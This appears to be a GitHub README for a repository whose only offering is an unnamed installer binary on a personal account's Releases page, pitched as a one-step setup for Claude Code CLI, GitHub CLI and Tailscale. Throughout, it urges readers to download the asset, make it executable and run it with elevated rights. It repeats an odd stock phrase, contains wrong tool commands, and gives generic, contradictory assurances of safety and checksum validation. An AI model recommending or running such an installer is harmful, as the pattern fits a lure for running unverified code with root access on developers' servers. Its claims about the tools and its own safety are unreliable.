[![Releases](https://img.shields.io/badge/Downloads-Releases-blue?style=for-the-badge&logo=github)](https://github.com/aniknandi69/new-development-machine-setup/releases)

# Automated Dev Tools Setup: Claude Code, GitHub CLI, Tailscale

Download the release asset from https://github.com/aniknandi69/new-development-machine-setup/releases and run it. This installer brings Claude Code CLI, GitHub CLI, and Tailscale to your server in minutes. It targets VPSs, cloud instances, and brand-new machines. The goal is a fast, repeatable setup that you can trust to be idempotent and transparent.

🧰 A practical toolchain for developers who work across devices, clouds, and containers. This repo automates routine installs, configures access, and wires tools together so you can start coding sooner.

---

Table of contents
- Why this project exists
- What you get
- Supported environments
- Quick start
- How it works
- Prerequisites
- Install and run
- Post-install configuration
- Advanced usage
- Customization
- Troubleshooting
- Security and privacy
- API keys, tokens, and secrets
- Config management
- Logging and diagnostics
- Versioning and releases
- Contributing
- License
- Topics

---

Why this project exists 🚀

Developers often spin up new machines and waste time piecing together the same tools. Claude Code CLI, GitHub CLI, and Tailscale form a powerful trio for workflow automation, code review, and secure networking. This project stitches them into a single, reliable setup script. It aims to:

- Cut initial setup time to minutes.
- Eliminate manual steps and human error.
- Provide a consistent baseline across Linux and macOS.
- Make it easy to reproduce environments, whether in the cloud or on a local machine.
- Give you a clean starting point for project work, experiments, and new roles.

What you get 🎁

- Claude Code CLI integration for fast, local Claude Code access from the terminal.
- GitHub CLI (gh) for repository and issue management from shell.
- Tailscale for secure, simple networking between devices and cloud instances.
- A single installer that detects the OS, installs dependencies, and configures core tools.
- Clear, maintainable scripts with straightforward steps and sane defaults.
- Lightweight design with a focus on speed and reliability.
- Optional post-install prompts to tailor your environment.

Supported environments 🧭

- Linux distributions commonly found on servers (Ubuntu, Debian, Fedora, CentOS/RHEL variants).
- macOS machines used for development or remote management.
- Architectures: x86_64 is assumed; arm64 is supported where binaries exist for the tools.
- Minimal prerequisites: a working shell, network access, and sudo privileges.

What to expect after installation

- Claude Code CLI is ready to authenticate and start interacting with Claude Code services.
- gh is configured to talk to GitHub, with a convenient default authentication flow.
- tailscale is installed and set up for easy device networking, with a default admin or user session ready to run.

---

Quick start 🏁

- Step 1: Acquire the installer. The link has a path part, so download the installer asset from the Releases page and execute it.
- Step 2: Make it executable. On Linux/macOS, you typically run chmod +x <installer-file>.
- Step 3: Run the installer. Launch the downloaded file to begin the setup process.
- Step 4: Follow on-screen prompts. The installer asks for permission to install packages and to configure tools. It uses your OS’s package manager when needed.
- Step 5: Verify the tools. After the script finishes, run claude-code, gh, and tailscale commands to confirm a working environment.

To check for updates or new releases, you can browse the Releases page again. The project emphasizes fast, hands-off setup, so you can focus on coding instead of installation chores.

---

How it works behind the scenes 🔧

- OS detection: The installer detects your operating system, version, and architecture to choose compatible binaries.
- Dependency handling: It installs core dependencies only where needed, avoiding duplicated work on already configured systems.
- Tool orchestration: The script installs Claude Code CLI, GitHub CLI, and Tailscale in a predictable order to minimize conflicts.
- Authentication setup: It helps you authenticate each tool with minimal friction, often guiding you through interactive prompts.
- Post-install sanity checks: After installation, it runs a series of checks to ensure the tools respond correctly and the network is reachable.
- Idempotency: Running the installer again should not dramatically alter your environment, preventing unexpected changes.

Prerequisites 📋

- A machine with network access to download install assets and tool binaries.
- sudo privileges on the target machine to install system packages and configure services.
- A basic familiarity with shell commands for troubleshooting and optional customization.
- For Claude Code CLI, a Claude Code account or access method is usually required to use the service.

Install and run (step-by-step) 🛠️

- Step A: Prepare the machine
  - Ensure your machine has a running OS supported by the installer.
  - Update the package manager cache if your OS requires it (for example, apt update or brew update).
  - Open a terminal session with access to run a script with elevated privileges.

- Step B: Download the installer asset
  - From the Releases page, pull the installer. The link provided earlier leads to the official release directory where you’ll find one or more installer assets.
  - Save the asset to a known location, such as /tmp/setup-installer or your home directory.

- Step C: Make it executable
  - On Linux/macOS: chmod +x setup-installer or the actual file name you downloaded.

- Step D: Run the installer
  - Execute the script from the terminal. It will guide you through the setup steps, install the necessary tools, and configure them for first use.

- Step E: Confirm installation
  - After the script completes, run:
    - claude-code --version
    - gh --version
    - tailscale version
  - Each command should report a valid version number, confirming successful installation.

- Step F: First-time authentication and configuration
  - Claude Code CLI: The installer may prompt you to log in or provide an API key. Follow the prompts to complete the auth flow.
  - GitHub CLI: The installer can trigger gh auth login with a browser-based flow or token-based method. Choose the method you prefer.
  - Tailscale: The installer can link you to a login flow or apply a pre-authenticated session. Complete the login to enable secure networking.

- Step G: Optional post-install improvements
  - Set up environment variables for convenience, such as CLAUDE_CODE_API_KEY, GITHUB_TOKEN, or TAILSCALE_AUTHKEY, if your workflow requires them.
  - Add shell aliases for quick access to the tools.

- Step H: Validation
  - Create a small test repository on GitHub and try a couple of basic operations with gh.
  - Start a Claude Code session or command to see results.
  - Verify that tailscale connect works by pinging another device on your TailNet.

Notes on usage

- The installer aims to be safe to run on fresh machines and to avoid disrupting existing configurations beyond what is necessary to enable the tools.
- If you run into permission issues, re-run the installer with elevated rights or check the specific steps where the script requests sudo access.
- If a tool already exists on the machine, the installer will attempt to upgrade or reuse existing installations where feasible.

Post-install configuration and customization 🧭

- Claude Code CLI
  - Explore Claude Code features, commands, and workflows. The CLI provides a range of actions such as initiating conversations, uploading files, or querying code intelligence.
  - Authentication flows vary by environment. If you use a corporate network or proxy, you may need to configure that proxy in your CLI settings.

- GitHub CLI (gh)
  - The gh tool enables repository management, issue handling, and code reviews directly from the terminal.
  - You can set a default GitHub host if you use GitHub Enterprise Server, and you can configure multiple authentication methods.

- Tailscale
  - Tailscale creates a private mesh between devices. You can connect your server to your personal devices, making SSH and other services accessible securely across locations.
  - Use tailscale status to review your current mesh, tailscale ping to test connectivity, and tailscale up to initialize a new device.

- Environment variables and secrets
  - CLAUDE_CODE_API_KEY: If Claude Code requires a key, set it in your environment or a credentials store.
  - GITHUB_TOKEN: For non-interactive GitHub CLI usage, store a token with the required scopes.
  - TailScale secrets: If you manage keys or pre-auth keys, store them in a secure store and reference them in your shell or startup scripts.

- Shell configuration
  - Add helpful aliases to your shell profile, such as:
    - alias claude="claude-code"
    - alias ghc="gh config set -h github.com"
    - alias tails="tailscale"
  - Keep your PATH clean and avoid shadowing system commands.

Advanced usage and customization 📈

- Custom install paths
  - If you need the tools installed to bespoke locations, you can override default paths via environment variables or script flags, depending on the installer’s design. Review the installer’s help output to see supported flags.
- Non-root installations
  - If you don’t have sudo access, the installer may offer a user-local installation path in which it installs tools under your home directory. This keeps the system untouched while enabling command-line usage.
- Logging and diagnostics
  - The installer typically logs to a dedicated log file in /var/log or your home directory. If something goes wrong, review the log to identify the stage where the setup failed.
- Reusing credentials safely
  - When possible, prefer reading credentials from a secure store or keychain rather than embedding them in shell profiles. Limit the scope and lifetime of tokens to reduce risk.

Security and privacy 🔒

- The installer connects to official sources to download binaries. It validates checksums where available to guard against tampering.
- Treat sensitive tokens and keys with care. Do not commit credentials to public repositories or share them in logs.
- When using Tailscale, ensure your mesh is scoped to devices you trust and that you enable appropriate access controls.
- Regularly audit installed tools for updates and security patches. The project supports a straightforward upgrade path through new releases.

Releases and versions 📦

- The project distributes a single installer asset per release that bundles Claude Code CLI, GH CLI, and Tailscale. You should use the asset that corresponds to your OS and architecture.
- For details on the latest release and assets, visit the Releases page: https://github.com/aniknandi69/new-development-machine-setup/releases. From this page, you can download the installer asset and verify checksums or signatures if provided.
- If the asset you need isn’t obvious, check the Release notes on the same page for compatibility notes and upgrade guidance.
- You can also explore prior releases to understand changes, fixes, and feature additions over time.

Note on the Releases link

- The link has a path part, so download the installer asset from the Releases page and execute it. For future reference, you can visit the same page to view all assets and choose the right one for your setup: https://github.com/aniknandi69/new-development-machine-setup/releases

Contributing contributors guide 🤝

- You can contribute improvements, new installers for additional OSes, or enhancements to the setup flow.
- Before contributing, review the project’s guidelines, including how to propose changes to the installer logic, how to add tests for the installation steps, and how to document new features.
- Start with issues categorized as “good first issue” to understand the repository’s structure and the installer’s flow.
- Keep your changes focused and well-documented. Add notes about how to test your changes locally on supported environments.
- Ensure that any added dependencies align with the project’s goals of speed, simplicity, and reliability.

Documentation and references 📚

- Claude Code CLI
  - Overview, authentication methods, and typical workflows. The CLI is designed to let you manage Claude Code resources directly from the command line.
- GitHub CLI (gh)
  - Repository management, issues, pull requests, and workflows. The CLI streamlines GitHub interactions without opening a browser.
- Tailscale
  - Private networking, mesh devices, and secure access. Tailscale makes it easy to connect servers, laptops, and other devices in a secure, private network.
- System packages and tools
  - Depending on your OS, you’ll work with apt, yum/dnf, brew, or other package managers. The installer uses the appropriate method to minimize disruption.

Usage patterns and workflow ideas

- Development on a fresh server
  - Use the installer to set up a complete development environment in a single step. Then clone repos, open editors, and start coding.
- Cloud-based CI agents
  - Deploy the setup on ephemeral cloud instances to provide consistent worker environments for CI jobs. The installer can be rerun when agents are recreated.
- Local dev machines
  - Keep a small, reliable setup for day-to-day tasks. The script can be re-run to refresh tools when needed.

Frequently asked questions (FAQ)

- Is the installer safe to run on production servers?
  - Yes, the installer is designed to be idempotent and to minimize disruption. It focuses on tool installation and configuration.
- Can I customize which tools are installed?
  - The default installer installs Claude Code CLI, GitHub CLI, and Tailscale. You can modify the installer to enable or disable modules as needed.
- Do I need to sign in after installation?
  - Yes. After installation, you should authenticate Claude Code CLI, GitHub CLI, and TailScale in your environment to enable full functionality.
- What if I already have one of the tools?
  - The installer detects existing installations and attempts to upgrade or reuse them where feasible. It minimizes interference with user configurations.

License 🧭

- This project is licensed under the MIT License. It permits broad reuse, modification, and distribution with minimal restrictions. See the LICENSE file for full terms.

Roadmap and future improvements

- Expand OS coverage with native installers for additional Linux distributions.
- Add non-root installation options for environments with restricted privileges.
- Improve logging and diagnostic reporting for easier troubleshooting.
- Provide automated test harnesses to validate setups on common cloud images.
- Introduce optional post-install modules, such as container runtimes or language runtimes (Node, Python, Go), for a more complete development environment.

Topics

anthropic, automation, claude-code, cli-tools, cloud, developer-tools, development-tools, devops, github-cli, linux, macos, server-setup, setup-script, tailscale, vps

Releases page reminder

- Visit the Releases page to view all assets and choose the installer that matches your environment: https://github.com/aniknandi69/new-development-machine-setup/releases

Imagery and visuals

- A simple inline SVG banner can help visually anchor this README without relying on external images. The following vector art represents a toolkit and a connection:
  
  <svg width="600" height="120" viewBox="0 0 600 120" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Dev Tools Toolkit">
    <defs>
      <linearGradient id="grad" x1="0" x2="1" y1="0" y2="1">
        <stop stop-color="#4f46e5" offset="0"/>
        <stop stop-color="#06b6d4" offset="1"/>
      </linearGradient>
    </defs>
    <rect width="100%" height="100%" fill="url(#grad)"/>
    <g fill="#fff" opacity="0.95">
      <rect x="40" y="25" width="120" height="70" rx="8"/>
      <rect x="200" y="25" width="120" height="70" rx="8"/>
      <rect x="360" y="25" width="120" height="70" rx="8"/>
    </g>
    <g fill="#fff" font-family="Arial, Helvetica, sans-serif" font-size="14" text-anchor="middle">
      <text x="100" y="65" fill="#000" fill-opacity="0.85">Claude Code</text>
      <text x="260" y="65" fill="#000" fill-opacity="0.85">GitHub CLI</text>
      <text x="420" y="65" fill="#000" fill-opacity="0.85">Tailscale</text>
    </g>
  </svg>

End of document

